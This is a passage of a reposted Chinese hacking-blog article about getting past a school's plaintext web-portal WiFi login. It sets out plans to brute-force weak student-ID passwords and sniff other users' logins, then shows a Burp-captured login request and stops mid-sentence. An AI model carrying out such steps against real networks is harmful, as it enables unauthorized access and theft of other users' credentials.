<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>非https协议web方式wifi认证突破 | Return&#39;s Blog </title>
  <meta name="author" content="Return">
  
  <meta name="description" content="专注于互联网开发技术，注重网络安全技术，注重网络攻防技术，注重渗透测试技术，backtrack5渗透测试平台研究，软件开发，网页设计，网页制作，网站建设">
  
  
  <meta property="og:title" content="非https协议web方式wifi认证突破"/>
  <meta property="og:site_name" content="Return&#39;s Blog "/>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
    <meta property="og:image" content="undefined"/>
  
   <link rel="apple-touch-icon" href="/icon.png" />
   <link rel="shortcut icon" href="/favicon.png" >
   <link rel="alternate" href="http://www.creturn.com/atom.xml" title="Return&#39;s Blog " type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  <script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
</head>


<body>
  <div id="content" class="inner">
    <aside id="sidebar" class="alignleft">
      <div class="navigationBar">
        <a href="/">Return&#39;s Blog </a>
      </div>
    	
  <nav class="widget" id="menu">
	<ul>
    
      <li class="cell"><a class="next" href="/">Home</a><li>
    
      <li class="cell"><a class="next" href="/archives/">Archives</a><li>
    
      <li class="cell"><a class="next" href="/about/">About</a><li>
    
    </ul>
</nav>

  
<div class="widget tag">
  <h3 class="title">分类</h3>
  <ul class="entry">
  
    <li><a href="/categories/原创作品/">原创作品</a><small>30</small></li>
  
    <li><a href="/categories/原创作品/技术文章/">技术文章</a><small>23</small></li>
  
    <li><a href="/categories/技术文章/">技术文章</a><small>7</small></li>
  
    <li><a href="/categories/技术文章/最新漏洞/">最新漏洞</a><small>2</small></li>
  
    <li><a href="/categories/原创作品/技术文章/最新漏洞/">最新漏洞</a><small>3</small></li>
  
    <li><a href="/categories/最新漏洞/">最新漏洞</a><small>1</small></li>
  
  </ul>
</div>


  
<div class="widget tagcloud">
  <h3 class="title">标签云</h3>
  <div class="entry">
    <a href="/tags/Android/" style="font-size: 10.00px;">Android</a><a href="/tags/Backtrack5/" style="font-size: 10.00px;">Backtrack5</a><a href="/tags/Metasploit/" style="font-size: 10.00px;">Metasploit</a><a href="/tags/Mysql/" style="font-size: 10.00px;">Mysql</a><a href="/tags/Nginx解析漏洞/" style="font-size: 10.00px;">Nginx解析漏洞</a><a href="/tags/Return/" style="font-size: 10.00px;">Return</a><a href="/tags/ThinkPHP远程/" style="font-size: 10.00px;">ThinkPHP远程</a><a href="/tags/alfred/" style="font-size: 10.00px;">alfred</a><a href="/tags/android/" style="font-size: 13.33px;">android</a><a href="/tags/apache/" style="font-size: 10.00px;">apache</a><a href="/tags/armitage/" style="font-size: 10.00px;">armitage</a><a href="/tags/arp欺骗/" style="font-size: 10.00px;">arp欺骗</a><a href="/tags/cain/" style="font-size: 10.00px;">cain</a><a href="/tags/dedecms漏洞/" style="font-size: 10.00px;">dedecms漏洞</a><a href="/tags/easyui/" style="font-size: 10.00px;">easyui</a><a href="/tags/eclipse/" style="font-size: 10.00px;">eclipse</a><a href="/tags/java/" style="font-size: 10.00px;">java</a><a href="/tags/linux-arp欺骗/" style="font-size: 10.00px;">linux arp欺骗</a><a href="/tags/os-x/" style="font-size: 10.00px;">os x</a><a href="/tags/php/" style="font-size: 13.33px;">php</a><a href="/tags/phpcmsv9漏洞/" style="font-size: 16.67px;">phpcmsv9漏洞</a><a href="/tags/phpcsm2008漏洞/" style="font-size: 10.00px;">phpcsm2008漏洞</a><a href="/tags/python/" style="font-size: 13.33px;">python</a><a href="/tags/thinkPHP漏洞/" style="font-size: 10.00px;">thinkPHP漏洞</a><a href="/tags/ubuntu/" style="font-size: 10.00px;">ubuntu</a><a href="/tags/web-wifi认证/" style="font-size: 10.00px;">web wifi认证</a><a href="/tags/webshell/" style="font-size: 20.00px;">webshell</a><a href="/tags/window密码/" style="font-size: 10.00px;">window密码</a><a href="/tags/wordpress漏洞/" style="font-size: 13.33px;">wordpress漏洞</a><a href="/tags/workflow/" style="font-size: 10.00px;">workflow</a><a href="/tags/xUtils/" style="font-size: 10.00px;">xUtils</a><a href="/tags/互联网技术/" style="font-size: 10.00px;">互联网技术</a><a href="/tags/任意密码登录/" style="font-size: 10.00px;">任意密码登录</a><a href="/tags/任意读取文件漏洞/" style="font-size: 10.00px;">任意读取文件漏洞</a><a href="/tags/入侵/" style="font-size: 10.00px;">入侵</a><a href="/tags/后门/" style="font-size: 20.00px;">后门</a><a href="/tags/嗅探/" style="font-size: 10.00px;">嗅探</a><a href="/tags/图马/" style="font-size: 10.00px;">图马</a><a href="/tags/打飞机/" style="font-size: 10.00px;">打飞机</a><a href="/tags/注入漏洞/" style="font-size: 10.00px;">注入漏洞</a>
  </div>
</div>


    	<footer id="footer" class="inner"><div class="copyright">
  
  &copy; 2015 Return
  
</div>


<div style="position:relative; bottom: 23px">
  <script src="http://s95.cnzz.com/stat.php?id=4287542&web_id=4287542&show=pic1" language="JavaScript">
  </script>
</div>


</footer>
    </aside>
    
    
    <div id="hidden-navigationBar" class="navigationBar">
      <a href="/">Return&#39;s Blog </a>
    </div>
    <div id="main-col" class="alignright">
    <div id="wrapper">
      
<article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
  <header>
      
      
  
    <h1 class="title">非https协议web方式wifi认证突破</h1>
  

      <time datetime="2012-07-31T02:43:41.000Z"><a href="/html/2012-07-31-非https协议web方式wifi认证突破.html">7月 31 2012</a></time>
      
  </header>
    <div class="entry">
      
        <p>转自：法客 deleter</p>
<p>话说我是个游手好闲的人，趁着暑假四处游荡，投亲靠友。一日来到某校，看有wifi，如饥似渴的打算蹭个小网上上。做好字典破wpa，暴力破</p>
<p>wep的准备了都，连上wifi就傻眼了，web认证…</p>
<p>好吧，web认证。既然是web认证，少不了负责验证的服务器。经测试，随便输入一个网址后都会被重定向到A站的一个登陆页面。如果能做手</p>
<p>脚的话只能在这个页面上搞了。</p>
<p>know it then hack it。首先找到知情人士，得知开网要提前申请，并且此账户与mac绑定。这就给了我当头一棒。本来想着肯定有很多人密码</p>
<p>和用户名是一样的，而用户名又是学号，这样写个脚本暴力破解一个一个猜过去就行了。这样的话仅靠猜弱口令来登陆的话是不可能了。</p>
<p>既然输入网址能被重定向到一个页面，而且此页面所在的服务器是一个公网的ip，那么说，我肯定已经分配好ip了，仅差一个授权。</p>
<p>既然我已经有了一个ip，我就可以对所在的网段进行嗅探，如果能嗅探到登陆信息说不定还有点门路呢。</p>
<p>有了大致的思路，开工开工~</p>
<a id="more"></a>

<p>首先开brup抓本地包。在登陆页面随便输入一个用户名和密码，被brup拦下。数据包内容如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="request">POST <span class="string">/eportal/webgateuser.do?method=login_ajax_s26_in_out</span> HTTP/1.1</span></div><div class="line"><span class="attribute">Host</span>: <span class="string">x.x.x.x</span></div><div class="line"><span class="attribute">Proxy-Connection</span>: <span class="string">keep-alive</span></div><div class="line"><span class="attribute">Content-Length</span>: <span class="string">3864</span></div><div class="line"><span class="attribute">Cache-Control</span>: <span class="string">max-age=0</span></div><div class="line"><span class="attribute">Origin</span>: <span class="string">http://ooxx</span></div><div class="line"><span class="attribute">User-Agent</span>: <span class="string">Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5</span></div><div class="line"><span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded</span></div><div class="line"><span class="attribute">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></div><div class="line"><span class="attribute">Accept-Encoding</span>: <span class="string">gzip,deflate,sdch</span></div><div class="line"><span class="attribute">Accept-Language</span>: <span class="string">zh-CN,zh;q=0.8</span></div><div class="line"><span class="attribute">Accept-Charset</span>: <span class="string">GBK,utf-8;q=0.7,*;q=0.3</span></div><div class="line"><span class="attribute">Cookie</span>: <span class="string">EPORTAL_COOKIE_USERNAME=3530393031323137; EPORTAL_COOKIE_PASSWORD=3530393031323137; JSESSIONID=77E5D178759BD74801C9FAF8D4B4933F</span></div><div class="line"></div><div class="line"><span class="perl"><span class="keyword">s</span>=<span class="number">69</span>c73394ffea3cc2453dfd4cff2af4a5&amp;t=wireless&amp;ssid=ad3c77575724aefa351ab6744a2a38a<span class="number">0</span>&amp;apmac=<span class="number">6</span>db3d4ac6fdf391878c2635b7bc531fb&amp;mac=<span class="number">56053</span>fdf38ba0a3ba46ad1428f46fe61&amp;port=f8821b8335bb27ee&amp;url=f58cd7a67bbfecbcf3027f3e4bf7b380fb7aa95efe039033&amp;vid=&amp;net_access_type=internet&amp;username=deleter&amp;usernameHidden=deleter&amp;pwd=deleter&amp;seczone=&amp;validcode=no_check&amp;tipinfoHidden=<span class="variable">%3Cdiv</span>+style<span class="variable">%3D</span><span class="variable">%22border</span>-right<span class="variable">%3A</span>+<span class="variable">%23ddd476</span>+<span class="number">1</span>px+solid<span class="variable">%3B</span>+padding-right<span class="variable">%3A</span>+<span class="number">10</span>px<span class="variable">%3B</span>+border-top<span class="variable">%3A</span>+<span class="variable">%23ddd476</span>+<span class="number">1</span>px+solid<span class="variable">%3B</span>+padding-left<span class="variable">%3A</span>+<span class="number">10</span>px<span class="variable">%3B</span>+padding-bottom<span class="variable">%3A</span>+<span class="number">10</span>px<span class="variable">%3B</span>+border-left<span class="variable">%3A</span>+<span class="variable">%23ddd476</span>+<span class="number">1</span>px+solid<span class="variable">%3B</span>+padding-top<span class="variable">%3A</span>+<span class="number">10</span>px<span class="variable">%3B</span>+border-bottom<span class="variable">%3A</span>+<span class="variable">%23ddd476</span>+<span class="number">1</span>px+solid<span class="variable">%3B</span>+height<span class="variable">%3A</span>+<span class="number">90</span>px<span class="variable">%3B</span>+background-color<span class="variable">%3A</span>+<span class="variable">%23fdfadd</span><span class="variable">%3B</span>+text-align<span class="variable">%3A</span>+left<span class="variable">%22</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3Cp</span>+style<span class="variable">%3D</span><span class="variable">%22text</span>-align<span class="variable">%3A</span>+center<span class="variable">%22</span><span class="variable">%3E</span><span class="variable">%3Cspan</span>+style<span class="variable">%3D</span><span class="variable">%22font</span>-weight<span class="variable">%3A</span>+bold<span class="variable">%3B</span>+font-size<span class="variable">%3A</span>+<span class="number">12</span>px<span class="variable">%3B</span>+color<span class="variable">%3A</span>+<span class="variable">%23daa517</span><span class="variable">%3B</span>+line-height<span class="variable">%3A</span>+<span class="number">20</span>px<span class="variable">%22</span><span class="variable">%3E</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%8A</span><span class="variable">%E7</span><span class="variable">%BD</span><span class="variable">%91</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%A4</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%81</span><span class="variable">%E6</span><span class="variable">%96</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%BC</span><span class="variable">%8F</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%9A</span><span class="variable">%3C</span><span class="variable">%2Fspan</span><span class="variable">%3E</span><span class="variable">%3C</span><span class="variable">%2Fp</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3Cp</span>+style<span class="variable">%3D</span><span class="variable">%22color</span><span class="variable">%3A</span>+<span class="variable">%2302ae0a</span><span class="variable">%3B</span>+line-height<span class="variable">%3A</span>+<span class="number">17</span>px<span class="variable">%3B</span>+text-align<span class="variable">%3A</span>+center<span class="variable">%22</span><span class="variable">%3E</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%81</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%B8Web</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%A4</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%81</span><span class="variable">%E6</span><span class="variable">%96</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%BC</span><span class="variable">%8F</span><span class="variable">%E5</span><span class="variable">%8F</span><span class="variable">%AF</span><span class="variable">%E7</span><span class="variable">%9B</span><span class="variable">%B4</span><span class="variable">%E6</span><span class="variable">%8E</span><span class="variable">%A5</span><span class="variable">%E4</span><span class="variable">%BD</span><span class="variable">%BF</span><span class="variable">%E7</span><span class="variable">%94</span><span class="variable">%A8</span><span class="variable">%E6</span><span class="variable">%9C</span><span class="variable">%AC</span><span class="variable">%E9</span><span class="variable">%A1</span><span class="variable">%B5</span><span class="variable">%E9</span><span class="variable">%9D</span><span class="variable">%A2</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%A4</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%81</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E6</span><span class="variable">%97</span><span class="variable">%A0</span><span class="variable">%E9</span><span class="variable">%A1</span><span class="variable">%BB</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%8B</span><span class="variable">%E8</span><span class="variable">%BD</span><span class="variable">%BD</span><span class="variable">%E5</span><span class="variable">%AE</span><span class="variable">%A2</span><span class="variable">%E6</span><span class="variable">%88</span><span class="variable">%B7</span><span class="variable">%E7</span><span class="variable">%AB</span><span class="variable">%AF</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%A4</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%81</span><span class="variable">%E8</span><span class="variable">%BD</span><span class="variable">%AF</span><span class="variable">%E4</span><span class="variable">%BB</span><span class="variable">%B6</span><span class="variable">%3C</span><span class="variable">%2Fp</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3Cp</span><span class="variable">%3E</span><span class="variable">%3C</span><span class="variable">%2Fp</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3C</span><span class="variable">%2Fdiv</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3Cdiv</span>+style<span class="variable">%3D</span><span class="variable">%22margin</span>-left<span class="variable">%3A</span>+<span class="number">15</span>px<span class="variable">%3B</span>+margin-right<span class="variable">%3A</span>+<span class="number">15</span>px<span class="variable">%22</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3Cdiv</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3Cul</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span>++++<span class="variable">%3Cli</span><span class="variable">%3E</span><span class="variable">%E5</span><span class="variable">%9C</span><span class="variable">%A8</span><span class="variable">%E8</span><span class="variable">%BF</span><span class="variable">%9B</span><span class="variable">%E8</span><span class="variable">%A1</span><span class="variable">%8CWeb</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%A4</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%81</span><span class="variable">%E4</span><span class="variable">%B9</span><span class="variable">%8B</span><span class="variable">%E5</span><span class="variable">%89</span><span class="variable">%8D</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E5</span><span class="variable">%BB</span><span class="variable">%BA</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%AE</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%88</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%B3</span><span class="variable">%E9</span><span class="variable">%97</span><span class="variable">%AD</span><span class="variable">%E5</span><span class="variable">%90</span><span class="variable">%8E</span><span class="variable">%E5</span><span class="variable">%8F</span><span class="variable">%B0</span><span class="variable">%E7</span><span class="variable">%9A</span><span class="variable">%84</span><span class="variable">%E5</span><span class="variable">%BA</span><span class="variable">%94</span><span class="variable">%E7</span><span class="variable">%94</span><span class="variable">%A8</span><span class="variable">%E8</span><span class="variable">%BD</span><span class="variable">%AF</span><span class="variable">%E4</span><span class="variable">%BB</span><span class="variable">%B6</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E5</span><span class="variable">%A6</span><span class="variable">%82FTP</span><span class="variable">%E3</span><span class="variable">%80</span><span class="variable">%81MSN</span><span class="variable">%E7</span><span class="variable">%AD</span><span class="variable">%89</span><span class="variable">%E7</span><span class="variable">%AD</span><span class="variable">%89</span><span class="variable">%3C</span><span class="variable">%2Fli</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span>++++<span class="variable">%3Cli</span><span class="variable">%3E</span><span class="variable">%E5</span><span class="variable">%A6</span><span class="variable">%82</span><span class="variable">%E6</span><span class="variable">%9E</span><span class="variable">%9C</span><span class="variable">%E5</span><span class="variable">%87</span><span class="variable">%BA</span><span class="variable">%E7</span><span class="variable">%8E</span><span class="variable">%B0</span><span class="variable">%E6</span><span class="variable">%97</span><span class="variable">%A0</span><span class="variable">%E6</span><span class="variable">%B3</span><span class="variable">%95</span><span class="variable">%E8</span><span class="variable">%BF</span><span class="variable">%9E</span><span class="variable">%E6</span><span class="variable">%8E</span><span class="variable">%A5</span><span class="variable">%E5</span><span class="variable">%88</span><span class="variable">%B0</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%A4</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%81</span><span class="variable">%E9</span><span class="variable">%A1</span><span class="variable">%B5</span><span class="variable">%E9</span><span class="variable">%9D</span><span class="variable">%A2</span><span class="variable">%E7</span><span class="variable">%9A</span><span class="variable">%84</span><span class="variable">%E6</span><span class="variable">%83</span><span class="variable">%85</span><span class="variable">%E5</span><span class="variable">%86</span><span class="variable">%B5</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E5</span><span class="variable">%BB</span><span class="variable">%BA</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%AE</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%88</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%B3</span><span class="variable">%E9</span><span class="variable">%97</span><span class="variable">%AD</span><span class="variable">%E5</span><span class="variable">%90</span><span class="variable">%8E</span><span class="variable">%E5</span><span class="variable">%8F</span><span class="variable">%B0</span><span class="variable">%E7</span><span class="variable">%9A</span><span class="variable">%84</span><span class="variable">%E5</span><span class="variable">%BA</span><span class="variable">%94</span><span class="variable">%E7</span><span class="variable">%94</span><span class="variable">%A8</span><span class="variable">%E8</span><span class="variable">%BD</span><span class="variable">%AF</span><span class="variable">%E4</span><span class="variable">%BB</span><span class="variable">%B6</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E5</span><span class="variable">%86</span><span class="variable">%8D</span><span class="variable">%E9</span><span class="variable">%87</span><span class="variable">%8D</span><span class="variable">%E6</span><span class="variable">%96</span><span class="variable">%B0</span><span class="variable">%E6</span><span class="variable">%89</span><span class="variable">%93</span><span class="variable">%E5</span><span class="variable">%BC</span><span class="variable">%80</span><span class="variable">%E6</span><span class="variable">%B5</span><span class="variable">%8F</span><span class="variable">%E8</span><span class="variable">%A7</span><span class="variable">%88</span><span class="variable">%E5</span><span class="variable">%99</span><span class="variable">%A8</span><span class="variable">%3C</span><span class="variable">%2Fli</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span>++++<span class="variable">%3Cli</span><span class="variable">%3E</span><span class="variable">%E5</span><span class="variable">%A6</span><span class="variable">%82</span><span class="variable">%E6</span><span class="variable">%9E</span><span class="variable">%9C</span><span class="variable">%E8</span><span class="variable">%A6</span><span class="variable">%81</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%8B</span><span class="variable">%E7</span><span class="variable">%BA</span><span class="variable">%BF</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%B7</span><span class="variable">%E7</span><span class="variable">%82</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%87</span><span class="variable">%BB</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%8B</span><span class="variable">%E7</span><span class="variable">%BA</span><span class="variable">%BF</span><span class="variable">%E6</span><span class="variable">%8C</span><span class="variable">%89</span><span class="variable">%E9</span><span class="variable">%92</span><span class="variable">%AE</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E7</span><span class="variable">%84</span><span class="variable">%B6</span><span class="variable">%E5</span><span class="variable">%90</span><span class="variable">%8E</span><span class="variable">%E5</span><span class="variable">%86</span><span class="variable">%8D</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%B3</span><span class="variable">%E9</span><span class="variable">%97</span><span class="variable">%AD</span><span class="variable">%E6</span><span class="variable">%B5</span><span class="variable">%8F</span><span class="variable">%E8</span><span class="variable">%A7</span><span class="variable">%88</span><span class="variable">%E5</span><span class="variable">%99</span><span class="variable">%A8</span><span class="variable">%E7</span><span class="variable">%AA</span><span class="variable">%97</span><span class="variable">%E5</span><span class="variable">%8F</span><span class="variable">%A3</span><span class="variable">%3C</span><span class="variable">%2Fli</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span>++++<span class="variable">%3Cli</span><span class="variable">%3E</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%A4</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%81</span><span class="variable">%E6</span><span class="variable">%88</span><span class="variable">%90</span><span class="variable">%E5</span><span class="variable">%8A</span><span class="variable">%9F</span><span class="variable">%E5</span><span class="variable">%90</span><span class="variable">%8E</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E4</span><span class="variable">%BC</span><span class="variable">%9A</span><span class="variable">%E6</span><span class="variable">%9C</span><span class="variable">%89</span><span class="variable">%E6</span><span class="variable">%A0</span><span class="variable">%87</span><span class="variable">%E9</span><span class="variable">%A2</span><span class="variable">%98</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%BA</span><span class="variable">%E2</span><span class="variable">%80</span><span class="variable">%9CWeb</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%A4</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%81</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%8B</span><span class="variable">%E7</span><span class="variable">%BA</span><span class="variable">%BF</span><span class="variable">%E9</span><span class="variable">%A1</span><span class="variable">%B5</span><span class="variable">%E9</span><span class="variable">%9D</span><span class="variable">%A2</span>+<span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%B7</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%8D</span><span class="variable">%E8</span><span class="variable">%A6</span><span class="variable">%81</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%B3</span><span class="variable">%E9</span><span class="variable">%97</span><span class="variable">%AD</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%A5</span><span class="variable">%E9</span><span class="variable">%A1</span><span class="variable">%B5</span><span class="variable">%E9</span><span class="variable">%9D</span><span class="variable">%A2</span><span class="variable">%E2</span><span class="variable">%80</span><span class="variable">%9D</span><span class="variable">%E7</span><span class="variable">%9A</span><span class="variable">%84</span><span class="variable">%E7</span><span class="variable">%AA</span><span class="variable">%97</span><span class="variable">%E5</span><span class="variable">%8F</span><span class="variable">%A3</span><span class="variable">%E5</span><span class="variable">%BC</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%87</span><span class="variable">%BA</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%B0</span><span class="variable">%E5</span><span class="variable">%BD</span><span class="variable">%95</span><span class="variable">%E6</span><span class="variable">%82</span><span class="variable">%A8</span><span class="variable">%E4</span><span class="variable">%B8</span><span class="variable">%8A</span><span class="variable">%E7</span><span class="variable">%BD</span><span class="variable">%91</span><span class="variable">%E7</span><span class="variable">%9A</span><span class="variable">%84</span><span class="variable">%E4</span><span class="variable">%BF</span><span class="variable">%A1</span><span class="variable">%E6</span><span class="variable">%81</span><span class="variable">%AF</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%9B</span><span class="variable">%E5</span><span class="variable">%A6</span><span class="variable">%82</span><span class="variable">%E6</span><span class="variable">%9E</span><span class="variable">%9C</span><span class="variable">%E6</span><span class="variable">%B2</span><span class="variable">%A1</span><span class="variable">%E6</span><span class="variable">%9C</span><span class="variable">%89</span><span class="variable">%E5</span><span class="variable">%BC</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%87</span><span class="variable">%BA</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E8</span><span class="variable">%AF</span><span class="variable">%B7</span><span class="variable">%E6</span><span class="variable">%A3</span><span class="variable">%80</span><span class="variable">%E6</span><span class="variable">%9F</span><span class="variable">%A5</span><span class="variable">%E6</span><span class="variable">%B5</span><span class="variable">%8F</span><span class="variable">%E8</span><span class="variable">%A7</span><span class="variable">%88</span><span class="variable">%E5</span><span class="variable">%99</span><span class="variable">%A8</span><span class="variable">%E8</span><span class="variable">%AE</span><span class="variable">%BE</span><span class="variable">%E7</span><span class="variable">%BD</span><span class="variable">%AE</span><span class="variable">%EF</span><span class="variable">%BC</span><span class="variable">%8C</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%B3</span><span class="variable">%E9</span><span class="variable">%97</span><span class="variable">%AD</span><span class="variable">%E5</span><span class="variable">%BC</span><span class="variable">%B9</span><span class="variable">%E5</span><span class="variable">%87</span><span class="variable">%BA</span><span class="variable">%E7</span><span class="variable">%AA</span><span class="variable">%97</span><span class="variable">%E5</span><span class="variable">%8F</span><span class="variable">%A3</span><span class="variable">%E6</span><span class="variable">%8B</span><span class="variable">%A6</span><span class="variable">%E6</span><span class="variable">%88</span><span class="variable">%AA</span><span class="variable">%E5</span><span class="variable">%B7</span><span class="variable">%A5</span><span class="variable">%E5</span><span class="variable">%85</span><span class="variable">%B7</span><span class="variable">%E3</span><span class="variable">%80</span><span class="variable">%82</span><span class="variable">%3C</span><span class="variable">%2Fli</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3C</span><span class="variable">%2Ful</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3C</span><span class="variable">%2Fdiv</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3Cul</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span>++++<span class="variable">%3Cli</span><span class="variable">%3EBefore</span>+carrying+out+Web+authentication+is+recommended+that+you+turn+off+background+applications<span class="variable">%2C</span>+such+as+FTP<span class="variable">%2C</span>+MSN<span class="variable">%2C</span>+etc.<span class="variable">%3C</span><span class="variable">%2Fli</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span>++++<span class="variable">%3Cli</span><span class="variable">%3EIf</span>+unable+to+<span class="keyword">connect</span>+to+the+authentication+page<span class="variable">%2C</span>+it+is+recommended+to+<span class="keyword">close</span>+the+back-end+application+software<span class="variable">%2C</span>+<span class="keyword">and</span>+then+re-<span class="keyword">open</span>+the+browser.<span class="variable">%3C</span><span class="variable">%2Fli</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span>++++<span class="variable">%3Cli</span><span class="variable">%3EIf</span>+you+want+offline<span class="variable">%2C</span>+please+click+the+offline+button<span class="variable">%2C</span>+<span class="keyword">and</span>+then+<span class="keyword">close</span>+the+browser+window.<span class="variable">%3C</span><span class="variable">%2Fli</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span>++++<span class="variable">%3Cli</span><span class="variable">%3EAuthentication</span>+is+successful<span class="variable">%2C</span>+there+will+be+titled+<span class="variable">%22Web</span>+authentication+page+off+the+assembly+line<span class="variable">%2C</span>+<span class="keyword">do</span>+<span class="keyword">not</span>+<span class="keyword">close</span>+the+page<span class="variable">%22</span>+window+pops+up<span class="variable">%2C</span>+record+your+Internet+access+information<span class="variable">%3B</span>+If+there+are+<span class="keyword">no</span>+<span class="keyword">pop</span>-up<span class="variable">%2C</span>+please+check+your+browser+settings<span class="variable">%2C</span>+<span class="keyword">close</span>+the+<span class="keyword">pop</span>-up+blocker+tool.<span class="variable">%3C</span><span class="variable">%2Fli</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3C</span><span class="variable">%2Ful</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3C</span><span class="variable">%2Fdiv</span><span class="variable">%3E</span><span class="variable">%0D</span><span class="variable">%0A</span><span class="variable">%3Cp</span><span class="variable">%3E</span><span class="variable">%C2</span><span class="variable">%A0</span><span class="variable">%3C</span><span class="variable">%2Fp</span><span class="variable">%3E</span></span></div></pre></td></tr></table></figure>

<p>按照打探得的消息，整个数据包有用的参数只有mac、username、usernameHidden、pwd，其他的大致都是与无线路由什么的有关。最后那段</p>
